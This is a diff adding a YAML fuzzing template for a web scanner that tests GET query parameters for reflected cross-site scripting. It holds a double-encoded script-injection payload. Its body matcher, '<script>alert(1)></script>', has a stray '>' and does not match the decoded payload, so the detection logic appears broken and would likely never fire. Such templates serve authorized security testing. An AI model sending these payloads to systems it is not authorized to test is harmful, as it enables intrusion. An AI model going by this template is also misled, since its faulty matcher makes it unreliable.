@@ -1,0 +1,36 @@
+id: nagli-bypass-reflected-xss
+
+info:
+  name: Nagli XSS in GET Parameters
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss:
+        - "ax6zt%2522%253e%253cscript%253ealert%25281%2529%253c%252fscript%253ey6uu6"  
+
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: postfix
+        fuzz:
+          - "{{xss}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)></script>"
+        
+      - type: word
+        part: header
+        words:
+          - text/html
